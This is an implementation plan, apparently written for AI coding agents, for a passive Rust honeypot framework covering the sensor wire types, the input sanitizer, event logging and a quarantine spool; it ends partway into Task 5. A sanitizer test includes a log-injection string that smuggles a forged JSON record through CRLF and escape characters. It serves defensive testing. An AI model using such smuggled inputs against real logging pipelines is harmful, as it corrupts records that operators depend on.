# Sensor Framework Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build sub-project 2 - four Rust crates comprising the sensor wire contract types, the shared sensor framework, the catch-all listener, and the SSH honeypot - testable in isolation with no database, no intake layer, and no live traffic.

**Architecture:** Sensor-framework-first. The wire types (`sensor-wire`) define the frozen NDJSON event record both sensors and intake import. The shared framework (`sensor-framework`) provides capture sanitization, WAN attribution, event emission, quarantine spool, listener lifecycle, resource bounds, and off-response-path capture hand-off. Two sensor binaries (`sensor-catchall`, `sensor-ssh`) are thin compositions over the framework, each owning only its protocol-specific capture logic. The SSH honeypot is a self-authored SSH server over vendored RustCrypto primitives; the server, the shell, the capture, and the protocol orchestration are all Propolis code - only the raw cryptographic operations are third-party. Canonical spec: `internal/design/02-sensor-framework.md`; frozen wire contract: `internal/architecture/frozen-contracts.md`; integrity amendment: ADR-0010; SSH implementation decision: ADR-0011.

**Tech Stack:** Rust (2024 edition), `serde`/`serde_json` (wire serialization), `chrono` (timestamps), `tokio` (async runtime, TCP/UDP, channels, fs), `sha2` (spool hashing + SSH key exchange), `unicode-normalization` (capture sanitization NFC), `x25519-dalek` (SSH key exchange), `ed25519-dalek` (SSH host key), `chacha20poly1305` (SSH transport encryption), `rand` (key generation), `tracing` (structured logging). Dev: `russh` (real SSH client for integration tests), `proptest` (property-based adversarial input tests), `tempfile` (test directories).

## File Structure

```
crates/
  sensor-wire/
    Cargo.toml
    src/lib.rs                    # SensorEvent, SampleRef, wire constants, version marker

  sensor-framework/
    Cargo.toml
    src/
      lib.rs                      # public API re-exports
      config.rs                   # SensorConfig, PortSet, WanMap, ResourceBounds, SpoolConfig
      sanitize.rs                 # sanitize_value() - the single shared capture sanitizer
      wan.rs                      # WanResolver - local-address to WAN-IP resolution
      emit.rs                     # EventEmitter - atomic NDJSON line append to log file
      spool.rs                    # QuarantineSpool - SHA-256 named, size-bounded, budget-capped
      listener.rs                 # TcpAcceptor, UdpReceiver - accept/recv loops, lifecycle, shutdown
      bounds.rs                   # ConnectionGuard - timeout/duration/byte/concurrency enforcement
      handoff.rs                  # CaptureHandoff - bounded channel + worker, drop-on-full
    tests/
      sanitize_integration.rs     # end-to-end sanitization through the real capture path
      spool_integration.rs        # spool store/verify, budget, permissions
      listener_integration.rs     # TCP/UDP lifecycle, bind-failure, panic isolation

  sensor-catchall/
    Cargo.toml
    src/
      main.rs                     # binary entry + config loading + composition
      handler.rs                  # TCP/UDP per-hit handler (emit catchall_probe)
    tests/
      integration.rs              # end-to-end catchall_probe tests

  sensor-ssh/
    Cargo.toml
    src/
      main.rs                     # binary entry + config loading + composition
      transport/
        mod.rs                    # SSH binary packet read/write, version exchange
        kex.rs                    # curve25519-sha256 key exchange state machine
        cipher.rs                 # ChaCha20-Poly1305@openssh.com encrypt/decrypt
        keys.rs                   # session key derivation from exchange hash
      hostkey.rs                  # ed25519 host key generation, persist, load
      auth.rs                     # user-auth state machine, accept-all, password drop
      channel.rs                  # SSH channel/session open, pty, shell/exec/subsystem dispatch
      shell.rs                    # fake shell - command parsing, canned responses, never-exec
      fakefs.rs                   # in-memory fake filesystem (common paths, RFC5737 IPs)
      transfer.rs                 # SCP/SFTP inbound file capture to quarantine spool
    tests/
      transport_test.rs           # packet framing, version exchange
      crypto_test.rs              # key exchange, host key, encryption round-trip
      auth_test.rs                # authenticated semantics, PII discipline
      shell_test.rs               # command capture, never-exec, no-outbound-fetch
      integration.rs              # real SSH client end-to-end (russh)

deploy/
  sensor-catchall.service         # hardened systemd unit
  sensor-ssh.service              # hardened systemd unit
  logrotate-sensors.conf          # size-based log rotation policy
```

## Global Constraints

- **Language:** Rust 2024 edition; toolchain pinned via existing `rust-toolchain.toml`. All four crates added to the workspace at `crates/{sensor-wire,sensor-framework,sensor-catchall,sensor-ssh}`.
- **Dependency vetting:** frozen-lockfile installs; review `Cargo.lock` diff on every dependency change; pin versions; confirm each crate's current API against its docs before use. No install scripts run. Crypto sources vendored in-tree via `cargo vendor` + `.cargo/config.toml`.
- **No database dependency.** `sensor-wire` and `sensor-framework` must not depend on `sqlx`, `postgres`, or any database crate. A sensor holds no database handle by construction.
- **No secrets.** No sensor crate depends on or reads any credential, API key, or vendor token. The SSH host key is the sole persisted key and is not a platform secret (ADR-0011).
- **No outbound network client.** `sensor-framework`, `sensor-catchall`, and `sensor-ssh` depend on no HTTP client, no outbound network library. A sensor never originates outbound traffic to any attacker-named destination. This is guaranteed by construction: the capability is not present in the dependency tree.
- **No process spawning.** `sensor-ssh` depends on no `std::process::Command`, no `exec`-family, no dynamic evaluation. The fake shell serves canned responses over an in-memory filesystem. This is the highest-risk property and the review gates on it.
- **Passive-only.** UDP listeners never send a response byte. TCP listeners respond only with protocol-specific server messages (SSH handshake, or close-after-capture for the catch-all). No active probing, no hack-back, no reflection.
- **PII dropped at capture.** Passwords are read and discarded in the same step, never stored in any event, log, or spool. Payload bodies travel only as hex or as SHA-256-named spool files, never as inline text in event metadata.
- **Capture sanitization.** Every attacker-controlled value passes through the single shared sanitizer `sanitize_value()` in `sensor-framework` before entering any record. No sensor hand-rolls a second path.
- **Fail closed.** A guard whose input is absent, unreadable, or malformed denies. A spool at budget refuses. A full capture queue drops. An unparseable input drops the connection, never crashes the accept loop.
- **Config values are validated and bounded.** Port sets, timeouts, spool budgets, connection caps are operator-configured, range-checked at startup, with safe defaults. Zero does not mean unlimited for any bound.
- **IP addresses in tests and canned responses:** RFC5737 (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) or RFC1918. Never real public IPs.
- **Commits:** conventional, lowercase, why-focused body, no AI-attribution trailer, no emoji.

---

### Task 1: sensor-wire crate scaffold + event record types

**Files:**
- Create: `crates/sensor-wire/Cargo.toml`, `crates/sensor-wire/src/lib.rs`
- Modify: `Cargo.toml` (add `sensor-wire` to workspace members)
- Test: inline in `crates/sensor-wire/src/lib.rs`

**Interfaces:**
- Consumes: nothing (leaf crate).
- Produces: `SensorEvent` struct (serde), `SampleRef` struct (serde), wire-format string constants (`WIRE_VERSION`, `SIGNAL_*`, `PROTO_*`). Imported by `sensor-framework`, `sensor-catchall`, `sensor-ssh`, and later by SP3 intake.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-wire/src/lib.rs
#[cfg(test)]
mod tests {
    use super::*;

    fn sample_event() -> SensorEvent {
        SensorEvent {
            v: WIRE_VERSION,
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: Some("198.51.100.4".parse().unwrap()),
            sensor: "ssh".into(),
            signal_type: SIGNAL_HONEYPOT_COMMAND_EXEC.into(),
            protocol: PROTO_TCP.into(),
            authenticated: true,
            observed_at: "2026-07-20T14:03:11.482913Z".parse().unwrap(),
            metadata: serde_json::json!({ "protocol_label": "ssh", "command": "uname -a" }),
            sample: None,
        }
    }

    #[test]
    fn round_trip_serde() {
        let event = sample_event();
        let json = serde_json::to_string(&event).unwrap();
        let back: SensorEvent = serde_json::from_str(&json).unwrap();
        assert_eq!(event, back);
    }

    #[test]
    fn ndjson_single_line() {
        let event = sample_event();
        let json = serde_json::to_string(&event).unwrap();
        assert!(!json.contains('\n'), "wire record must be a single line");
        assert!(!json.contains('\r'), "wire record must not contain CR");
    }

    #[test]
    fn sample_ref_round_trip() {
        let event = SensorEvent {
            sample: Some(SampleRef {
                sha256: "a".repeat(64),
                size: 12345,
                orig_name: "malware.bin".into(),
            }),
            ..sample_event()
        };
        let json = serde_json::to_string(&event).unwrap();
        let back: SensorEvent = serde_json::from_str(&json).unwrap();
        assert_eq!(event.sample, back.sample);
    }

    #[test]
    fn null_wan_ip_serializes() {
        let event = SensorEvent { wan_ip: None, ..sample_event() };
        let json = serde_json::to_string(&event).unwrap();
        assert!(json.contains("\"wan_ip\":null"));
        let back: SensorEvent = serde_json::from_str(&json).unwrap();
        assert_eq!(back.wan_ip, None);
    }

    #[test]
    fn version_marker() {
        assert_eq!(VERSION_MARKER, "sensor-wire");
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-wire`
Expected: FAIL - crate does not exist.

- [ ] **Step 3: Write minimal implementation**

Add `"crates/sensor-wire"` to workspace `Cargo.toml` members.

`crates/sensor-wire/Cargo.toml`:
```toml
[package]
name = "sensor-wire"
version = "0.1.0"
edition = "2024"

[dependencies]
serde = { version = "*", features = ["derive"] }
serde_json = "*"
chrono = { version = "*", features = ["serde"] }
```
Pin versions after checking current latest on crates.io. Review `Cargo.lock` diff.

`crates/sensor-wire/src/lib.rs`:
```rust
use std::net::IpAddr;
use chrono::{DateTime, Utc};

pub const VERSION_MARKER: &str = "sensor-wire";
pub const WIRE_VERSION: u32 = 1;

// Signal type constants - the snake_case wire values matching core-scoring's SignalType serde.
pub const SIGNAL_CATCHALL_PROBE: &str = "catchall_probe";
pub const SIGNAL_HONEYPOT_CONNECTION: &str = "honeypot_connection";
pub const SIGNAL_HONEYPOT_LOGIN_ATTEMPT: &str = "honeypot_login_attempt";
pub const SIGNAL_HONEYPOT_COMMAND_EXEC: &str = "honeypot_command_exec";
pub const SIGNAL_HONEYPOT_MALWARE_UPLOAD: &str = "honeypot_malware_upload";
pub const SIGNAL_HONEYPOT_FILE_DOWNLOAD: &str = "honeypot_file_download";

// Protocol constants - lowercase wire values matching core-scoring's Protocol serde.
pub const PROTO_TCP: &str = "tcp";
pub const PROTO_UDP: &str = "udp";
pub const PROTO_ICMP: &str = "icmp";

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct SensorEvent {
    pub v: u32,
    pub source_ip: IpAddr,
    pub wan_ip: Option<IpAddr>,
    pub sensor: String,
    pub signal_type: String,
    pub protocol: String,
    pub authenticated: bool,
    pub observed_at: DateTime<Utc>,
    pub metadata: serde_json::Value,
    pub sample: Option<SampleRef>,
}

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct SampleRef {
    pub sha256: String,
    pub size: u64,
    pub orig_name: String,
}
```

Note on `observed_at` serialization: `core-scoring` hashes `observed_at` as RFC 3339 string bytes (`hashing.rs:38`). Chrono's default serde produces RFC 3339 (`"2026-07-20T14:03:11.482913Z"`), which matches. Do NOT use `chrono::serde::ts_microseconds` (that produces integer timestamps, not RFC 3339). Use chrono's default derive, which is what `core-scoring` uses.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-wire`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add Cargo.toml Cargo.lock crates/sensor-wire
git commit -m "feat(sensor-wire): scaffold crate with event record and sample ref types"
```

---

### Task 2: sensor-framework scaffold + capture sanitization

**Files:**
- Create: `crates/sensor-framework/Cargo.toml`, `crates/sensor-framework/src/lib.rs`, `crates/sensor-framework/src/sanitize.rs`
- Modify: `Cargo.toml` (add `sensor-framework` to workspace members)
- Test: inline in `crates/sensor-framework/src/sanitize.rs`

**Interfaces:**
- Consumes: `sensor-wire` (workspace dependency).
- Produces: `pub fn sanitize_value(input: &str, max_len: usize) -> String` and `pub fn to_hex_bounded(bytes: &[u8], max_bytes: usize) -> String`. Every sensor uses these to sanitize attacker-controlled text before emission.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-framework/src/sanitize.rs
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cr_lf_replaced_with_space() {
        assert_eq!(sanitize_value("line1\r\nline2", 256), "line1 line2");
        assert_eq!(sanitize_value("a\nb\rc", 256), "a b c");
    }

    #[test]
    fn bare_cr_replaced() {
        assert_eq!(sanitize_value("before\rafter", 256), "before after");
    }

    #[test]
    fn tab_vt_ff_replaced() {
        assert_eq!(sanitize_value("a\tb\x0Bc\x0Cd", 256), "a b c d");
    }

    #[test]
    fn ansi_csi_stripped() {
        // ESC[31m = red color, ESC[0m = reset
        assert_eq!(sanitize_value("\x1b[31mred\x1b[0m", 256), "red");
    }

    #[test]
    fn c0_control_chars_stripped() {
        // BEL (0x07), BS (0x08), DEL (0x7F)
        assert_eq!(sanitize_value("hel\x07lo\x08wo\x7Frld", 256), "helloworld");
    }

    #[test]
    fn c1_control_range_stripped() {
        // C1 range: U+0080 - U+009F
        let input = "before\u{0085}after";  // NEL
        assert_eq!(sanitize_value(input, 256), "beforeafter");
    }

    #[test]
    fn unicode_line_separators_stripped() {
        assert_eq!(sanitize_value("a\u{2028}b\u{2029}c", 256), "abc");
    }

    #[test]
    fn bidi_overrides_stripped() {
        // LRO (U+202D), RLO (U+202E), LRI (U+2066), PDI (U+2069)
        assert_eq!(
            sanitize_value("normal\u{202D}evil\u{202E}text\u{2069}", 256),
            "normaleviltext"
        );
    }

    #[test]
    fn zero_width_chars_stripped() {
        // ZWSP (U+200B), ZWJ (U+200D), ZWNJ (U+200C), FEFF (BOM)
        assert_eq!(
            sanitize_value("a\u{200B}b\u{200D}c\u{200C}d\u{FEFF}e", 256),
            "abcde"
        );
    }

    #[test]
    fn nfc_normalization() {
        // e + combining acute (NFD) -> e-acute (NFC)
        let nfd = "e\u{0301}";
        let nfc = "\u{00E9}";
        assert_eq!(sanitize_value(nfd, 256), nfc);
    }

    #[test]
    fn length_cap() {
        let long = "a".repeat(500);
        let result = sanitize_value(&long, 100);
        assert!(result.len() <= 100);
    }

    #[test]
    fn combined_attack_single_line() {
        let attack = "cmd\r\n\x1b[31m{\"v\":1,\"signal_type\":\"evil\"}\x1b[0m\ttail\u{202E}";
        let result = sanitize_value(&attack, 256);
        assert!(!result.contains('\n'));
        assert!(!result.contains('\r'));
        assert!(!result.contains('\x1b'));
        assert!(!result.contains('\u{202E}'));
    }

    #[test]
    fn empty_string_passthrough() {
        assert_eq!(sanitize_value("", 256), "");
    }

    #[test]
    fn valid_text_passthrough() {
        let valid = "normal command -flag value";
        assert_eq!(sanitize_value(valid, 256), valid);
    }

    #[test]
    fn order_of_operations_cr_lf_before_control_strip() {
        // If control strip happened first, a \r\n could survive if the strip
        // removed something adjacent. The spec's order: whitespace replacement
        // FIRST, then control strip. This test catches the classic mistake.
        let input = "a\x01\r\nb";  // SOH + CRLF
        let result = sanitize_value(input, 256);
        assert!(!result.contains('\n'), "newline survived");
        assert_eq!(result, "a b");
    }

    #[test]
    fn hex_bounded_encoding() {
        let bytes = b"\xde\xad\xbe\xef\xca\xfe";
        assert_eq!(to_hex_bounded(bytes, 4), "deadbeef");
        assert_eq!(to_hex_bounded(bytes, 6), "deadbeefcafe");
        assert_eq!(to_hex_bounded(bytes, 100), "deadbeefcafe");
        assert_eq!(to_hex_bounded(b"", 100), "");
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-framework sanitize`
Expected: FAIL - crate does not exist.

- [ ] **Step 3: Write minimal implementation**

Add `"crates/sensor-framework"` to workspace `Cargo.toml` members.

`crates/sensor-framework/Cargo.toml`:
```toml
[package]
name = "sensor-framework"
version = "0.1.0"
edition = "2024"

[dependencies]
sensor-wire = { path = "../sensor-wire" }
serde = { version = "*", features = ["derive"] }
serde_json = "*"
chrono = { version = "*", features = ["serde"] }
tokio = { version = "*", features = ["rt-multi-thread", "macros", "net", "io-util", "sync", "signal", "fs", "time"] }
sha2 = "*"
unicode-normalization = "*"
tracing = "*"
```
Pin versions after checking current latest. Review lockfile diff.

`crates/sensor-framework/src/sanitize.rs` - implement `sanitize_value` following the spec's exact order of operations:

```rust
use unicode_normalization::UnicodeNormalization;

pub fn sanitize_value(input: &str, max_len: usize) -> String {
    // Step 1: CR, LF, tab, VT, FF -> single space FIRST (before any other stripping).
    let mut buf = String::with_capacity(input.len());
    for ch in input.chars() {
        match ch {
            '\r' | '\n' | '\t' | '\x0B' | '\x0C' => buf.push(' '),
            _ => buf.push(ch),
        }
    }

    // Step 2: Strip ANSI CSI sequences, C0/C1 controls, line separators,
    // invisible/bidi/zero-width characters.
    let stripped = strip_dangerous(&buf);

    // Step 3: NFC normalize.
    let normalized: String = stripped.nfc().collect();

    // Step 4: Truncate to max_len (on char boundary).
    truncate_to_len(&normalized, max_len)
}

pub fn to_hex_bounded(bytes: &[u8], max_bytes: usize) -> String {
    let limit = max_bytes.min(bytes.len());
    bytes[..limit].iter().map(|b| format!("{b:02x}")).collect()
}
```

The `strip_dangerous` helper must:
- Parse and remove ANSI CSI escape sequences (ESC `[` ... final byte in 0x40-0x7E).
- Remove C0 controls (0x00-0x1F except space/already-handled CR/LF/tab/VT/FF) and DEL (0x7F).
- Remove C1 controls (U+0080-U+009F).
- Remove U+2028 (line separator) and U+2029 (paragraph separator).
- Remove bidirectional override/isolate characters (U+200E-U+200F, U+202A-U+202E, U+2066-U+2069).
- Remove zero-width characters (U+200B-U+200D, U+FEFF).
- Remove other invisible characters from Unicode General Category Cf (format characters) that are not harmless (preserve legitimate combining marks).

Implement `truncate_to_len` to truncate on a char boundary, not a byte boundary.

`crates/sensor-framework/src/lib.rs`:
```rust
pub mod sanitize;
pub use sanitize::{sanitize_value, to_hex_bounded};
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-framework sanitize`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add Cargo.toml Cargo.lock crates/sensor-framework
git commit -m "feat(sensor-framework): scaffold crate with capture sanitization"
```

---

### Task 3: WAN attribution + event emission

**Files:**
- Create: `crates/sensor-framework/src/wan.rs`, `crates/sensor-framework/src/emit.rs`
- Modify: `crates/sensor-framework/src/lib.rs` (add modules + re-exports)
- Test: inline in `wan.rs` and `emit.rs`

**Interfaces:**
- Consumes: `SensorEvent` from `sensor-wire`.
- Produces: `WanResolver::new(map) -> Self`, `WanResolver::resolve(&self, local_addr: IpAddr) -> Option<IpAddr>`, `EventEmitter::new(log_path) -> Self`, `EventEmitter::append(&self, event: &SensorEvent) -> io::Result<()>`.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-framework/src/wan.rs
#[cfg(test)]
mod tests {
    use super::*;
    use std::net::IpAddr;

    #[test]
    fn resolve_with_mapping() {
        let mut map = std::collections::HashMap::new();
        let local: IpAddr = "10.0.0.1".parse().unwrap();
        let wan: IpAddr = "198.51.100.4".parse().unwrap();
        map.insert(local, wan);
        let resolver = WanResolver::new(map);
        assert_eq!(resolver.resolve(local), Some(wan));
    }

    #[test]
    fn resolve_without_mapping_returns_none() {
        let resolver = WanResolver::new(std::collections::HashMap::new());
        let addr: IpAddr = "10.0.0.99".parse().unwrap();
        assert_eq!(resolver.resolve(addr), None);
    }

    #[test]
    fn resolve_direct_wan_no_nat() {
        // When local == WAN (no NAT), the mapping contains an identity entry.
        let mut map = std::collections::HashMap::new();
        let addr: IpAddr = "198.51.100.4".parse().unwrap();
        map.insert(addr, addr);
        let resolver = WanResolver::new(map);
        assert_eq!(resolver.resolve(addr), Some(addr));
    }
}

// in crates/sensor-framework/src/emit.rs
#[cfg(test)]
mod tests {
    use super::*;
    use sensor_wire::*;

    fn sample_event() -> SensorEvent {
        SensorEvent {
            v: WIRE_VERSION,
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: Some("198.51.100.4".parse().unwrap()),
            sensor: "ssh".into(),
            signal_type: SIGNAL_HONEYPOT_COMMAND_EXEC.into(),
            protocol: PROTO_TCP.into(),
            authenticated: true,
            observed_at: "2026-07-20T14:03:11.482913Z".parse().unwrap(),
            metadata: serde_json::json!({"command": "uname -a"}),
            sample: None,
        }
    }

    #[tokio::test]
    async fn append_produces_valid_ndjson_line() {
        let dir = tempfile::tempdir().unwrap();
        let log_path = dir.path().join("events.jsonl");
        let emitter = EventEmitter::new(log_path.clone());
        emitter.append(&sample_event()).await.unwrap();
        let content = tokio::fs::read_to_string(&log_path).await.unwrap();
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 1);
        let parsed: SensorEvent = serde_json::from_str(lines[0]).unwrap();
        assert_eq!(parsed, sample_event());
    }

    #[tokio::test]
    async fn multiple_appends_produce_separate_lines() {
        let dir = tempfile::tempdir().unwrap();
        let log_path = dir.path().join("events.jsonl");
        let emitter = EventEmitter::new(log_path.clone());
        for _ in 0..5 {
            emitter.append(&sample_event()).await.unwrap();
        }
        let content = tokio::fs::read_to_string(&log_path).await.unwrap();
        let lines: Vec<&str> = content.lines().collect();
        assert_eq!(lines.len(), 5);
        for line in &lines {
            let _: SensorEvent = serde_json::from_str(line).unwrap();
        }
    }

    #[tokio::test]
    async fn emitted_line_has_no_embedded_newlines() {
        let dir = tempfile::tempdir().unwrap();
        let log_path = dir.path().join("events.jsonl");
        let emitter = EventEmitter::new(log_path.clone());
        emitter.append(&sample_event()).await.unwrap();
        let bytes = tokio::fs::read(&log_path).await.unwrap();
        // Exactly one newline, at the end.
        let newline_count = bytes.iter().filter(|&&b| b == b'\n').count();
        assert_eq!(newline_count, 1);
        assert_eq!(*bytes.last().unwrap(), b'\n');
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-framework -- wan emit`
Expected: FAIL - modules not defined.

- [ ] **Step 3: Write minimal implementation**

Add `tempfile` as a dev-dependency of `sensor-framework`.

`wan.rs`:
```rust
use std::collections::HashMap;
use std::net::IpAddr;

pub struct WanResolver {
    map: HashMap<IpAddr, IpAddr>,
}

impl WanResolver {
    pub fn new(map: HashMap<IpAddr, IpAddr>) -> Self {
        Self { map }
    }

    pub fn resolve(&self, local_addr: IpAddr) -> Option<IpAddr> {
        self.map.get(&local_addr).copied()
    }
}
```

`emit.rs`:
```rust
use std::path::PathBuf;
use sensor_wire::SensorEvent;

pub struct EventEmitter {
    log_path: PathBuf,
}

impl EventEmitter {
    pub fn new(log_path: PathBuf) -> Self {
        Self { log_path }
    }

    pub async fn append(&self, event: &SensorEvent) -> std::io::Result<()> {
        let mut line = serde_json::to_string(event)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
        line.push('\n');
        // Atomic append: the line is well under PIPE_BUF (4KB on Linux),
        // so a single write(2) with O_APPEND is atomic per POSIX.
        use tokio::io::AsyncWriteExt;
        let mut file = tokio::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&self.log_path)
            .await?;
        file.write_all(line.as_bytes()).await?;
        file.flush().await?;
        Ok(())
    }
}
```

Update `lib.rs` to add `pub mod wan;` and `pub mod emit;` and re-exports.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-framework -- wan emit`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/sensor-framework
git commit -m "feat(sensor-framework): WAN attribution and NDJSON event emission"
```

---

### Task 4: Quarantine spool

**Files:**
- Create: `crates/sensor-framework/src/spool.rs`
- Modify: `crates/sensor-framework/src/lib.rs` (add module + re-exports)
- Test: inline in `spool.rs` + `tests/spool_integration.rs`

**Interfaces:**
- Consumes: `SampleRef` from `sensor-wire`, `sha2` for hashing.
- Produces: `QuarantineSpool::new(dir, max_file_size, global_budget) -> Self`, `QuarantineSpool::store(&self, body: &[u8]) -> Result<SampleRef, SpoolError>`, `QuarantineSpool::verify(&self, sha256: &str) -> Result<(), SpoolError>`, `SpoolError` enum.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-framework/src/spool.rs
#[cfg(test)]
mod tests {
    use super::*;

    fn test_spool(max_file: u64, budget: u64) -> (tempfile::TempDir, QuarantineSpool) {
        let dir = tempfile::tempdir().unwrap();
        let spool = QuarantineSpool::new(dir.path().to_path_buf(), max_file, budget);
        (dir, spool)
    }

    #[test]
    fn store_and_verify_round_trip() {
        let (_dir, spool) = test_spool(1024, 1_000_000);
        let body = b"this is malware content";
        let sample = spool.store(body).unwrap();
        assert_eq!(sample.size, body.len() as u64);
        assert!(!sample.sha256.is_empty());
        spool.verify(&sample.sha256).unwrap();
    }

    #[test]
    fn sha256_naming() {
        let (_dir, spool) = test_spool(1024, 1_000_000);
        let body = b"test body";
        let sample = spool.store(body).unwrap();
        // Verify the file is named by its SHA-256.
        use sha2::{Sha256, Digest};
        let expected = format!("{:x}", Sha256::digest(body));
        assert_eq!(sample.sha256, expected);
    }

    #[test]
    fn duplicate_body_is_idempotent() {
        let (_dir, spool) = test_spool(1024, 1_000_000);
        let body = b"same body twice";
        let s1 = spool.store(body).unwrap();
        let s2 = spool.store(body).unwrap();
        assert_eq!(s1.sha256, s2.sha256);
    }

    #[test]
    fn size_limit_enforced() {
        let (_dir, spool) = test_spool(10, 1_000_000);
        let body = b"this body exceeds the ten byte limit";
        let result = spool.store(body);
        assert!(matches!(result, Err(SpoolError::FileSizeExceeded { .. })));
    }

    #[test]
    fn global_budget_enforced() {
        let (_dir, spool) = test_spool(100, 150);
        let body1 = vec![0u8; 100];
        spool.store(&body1).unwrap();
        let body2 = vec![1u8; 100];
        let result = spool.store(&body2);
        assert!(matches!(result, Err(SpoolError::BudgetExhausted { .. })));
    }

    #[test]
    fn verify_fails_on_corrupted_body() {
        let (dir, spool) = test_spool(1024, 1_000_000);
        let body = b"original content";
        let sample = spool.store(body).unwrap();
        // Corrupt the file on disk.
        let file_path = dir.path().join(&sample.sha256);
        std::fs::write(&file_path, b"corrupted").unwrap();
        let result = spool.verify(&sample.sha256);
        assert!(matches!(result, Err(SpoolError::HashMismatch { .. })));
    }

    #[test]
    fn verify_fails_on_missing_file() {
        let (_dir, spool) = test_spool(1024, 1_000_000);
        let result = spool.verify("nonexistent_hash");
        assert!(result.is_err());
    }

    #[test]
    #[cfg(unix)]
    fn file_permissions() {
        use std::os::unix::fs::PermissionsExt;
        let (dir, spool) = test_spool(1024, 1_000_000);
        let sample = spool.store(b"test body").unwrap();
        let file_path = dir.path().join(&sample.sha256);
        let perms = std::fs::metadata(&file_path).unwrap().permissions();
        let mode = perms.mode() & 0o777;
        assert_eq!(mode, 0o640, "spool file must be 0640, got {mode:o}");
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cargo test -p sensor-framework spool`
Expected: FAIL - module not defined.

- [ ] **Step 3: Write minimal implementation**

`spool.rs`:
```rust
use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};
use sha2::{Sha256, Digest};
use sensor_wire::SampleRef;

#[derive(Debug)]
pub enum SpoolError {
    FileSizeExceeded { size: u64, limit: u64 },
    BudgetExhausted { used: u64, budget: u64, attempted: u64 },
    HashMismatch { expected: String, actual: String },
    Io(std::io::Error),
}

impl From<std::io::Error> for SpoolError {
    fn from(e: std::io::Error) -> Self { SpoolError::Io(e) }
}

pub struct QuarantineSpool {
    dir: PathBuf,
    max_file_size: u64,
    global_budget: u64,
    used: AtomicU64,
}

impl QuarantineSpool {
    pub fn new(dir: PathBuf, max_file_size: u64, global_budget: u64) -> Self {
        Self { dir, max_file_size, global_budget, used: AtomicU64::new(0) }
    }

    pub fn store(&self, body: &[u8]) -> Result<SampleRef, SpoolError> {
        let size = body.len() as u64;
        if size > self.max_file_size {
            return Err(SpoolError::FileSizeExceeded { size, limit: self.max_file_size });
        }
        // Atomically check-and-reserve budget.
        loop {
            let current = self.used.load(Ordering::Relaxed);
            if current + size > self.global_budget {
                return Err(SpoolError::BudgetExhausted {
                    used: current, budget: self.global_budget, attempted: size,
                });
            }
            if self.used.compare_exchange(current, current + size,
                Ordering::AcqRel, Ordering::Relaxed).is_ok() {
                break;
            }
        }
        let hash = format!("{:x}", Sha256::digest(body));
        let file_path = self.dir.join(&hash);
        if !file_path.exists() {
            std::fs::write(&file_path, body)?;
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                std::fs::set_permissions(&file_path,
                    std::fs::Permissions::from_mode(0o640))?;
            }
        }
        Ok(SampleRef { sha256: hash, size, orig_name: String::new() })
    }

    pub fn verify(&self, sha256: &str) -> Result<(), SpoolError> {
        let file_path = self.dir.join(sha256);
        let body = std::fs::read(&file_path)?;
        let actual = format!("{:x}", Sha256::digest(&body));
        if actual != sha256 {
            return Err(SpoolError::HashMismatch {
                expected: sha256.to_string(), actual,
            });
        }
        Ok(())
    }
}
```

Note: `orig_name` is set by the sensor's handler when it has the attacker-supplied filename (SSH SCP/SFTP). The spool itself sets it to empty; the caller fills it in the `SampleRef` afterward or before building the event. Consider adding a `store_named(&self, body, orig_name) -> SampleRef` variant, or have the caller overwrite `orig_name` on the returned ref. Either way, `orig_name` must pass through `sanitize_value` before entering any event.

Update `lib.rs` to add `pub mod spool;` and re-export.

- [ ] **Step 4: Run test to verify it passes**

Run: `cargo test -p sensor-framework spool`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add crates/sensor-framework
git commit -m "feat(sensor-framework): quarantine spool with SHA-256 naming and byte budget"
```

---

### Task 5: Listener lifecycle + resource bounds

**Files:**
- Create: `crates/sensor-framework/src/listener.rs`, `crates/sensor-framework/src/bounds.rs`, `crates/sensor-framework/src/config.rs`
- Modify: `crates/sensor-framework/src/lib.rs` (add modules + re-exports)
- Test: `crates/sensor-framework/tests/listener_integration.rs`

**Interfaces:**
- Consumes: `tokio` (TCP/UDP, signal, time), `WanResolver` (Task 3).
- Produces: `ConnectionBounds` struct, `SensorConfig` struct, `run_tcp_listener(addr, bounds, handler) -> Result<(SocketAddr, JoinHandle)>`, `run_udp_listener(addr, handler) -> Result<(SocketAddr, JoinHandle)>`, `shutdown_signal() -> impl Future`. The handler closures are the per-connection/per-datagram logic each sensor provides. WAN resolution happens inside each sensor's handler (the handler receives the raw `TcpStream`/peer and calls `WanResolver` itself), not in the framework listener.

- [ ] **Step 1: Write the failing test**

```rust
// in crates/sensor-framework/tests/listener_integration.rs
use sensor_framework::bounds::ConnectionBounds;
use sensor_framework::listener::{run_tcp_listener, run_udp_listener};
use std::net::SocketAddr;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
